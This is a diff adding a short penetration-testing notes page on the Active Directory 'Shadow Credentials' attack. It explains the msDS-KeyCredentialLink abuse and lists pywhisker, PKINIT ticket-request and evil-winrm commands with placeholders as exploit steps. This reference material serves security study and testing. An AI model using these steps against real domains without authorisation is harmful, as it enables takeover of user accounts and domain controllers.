@@ -1,0 +1,18 @@
+# Shadow Credentials (msDS-KeyCredentialLink)
+
+{% hint style="info" %}
+[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
+{% endhint %}
+
+### Tools
+
+* [pywhisker](https://github.com/ShutdownRepo/pywhisker)
+* [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
+
+#### Exploit Steps
+
+* `pywhisker --dc-ip <IP> -d <domain> -u <user> -p <pass> --target <victim-user> --action add`
+* `python3 gettgtpkinit.py -cert-pfx ../file.pfx -pfx-pass '<pass>' -dc-ip <IP> <domain>/<victim-username> /tmp/<username>.ccache`&#x20;
+* `export KRB5CCNAME=/tmp/<username>.ccache`&#x20;
+* `klist`
+* `evil-winrm -i <DC-FQDN> -r <domain>`
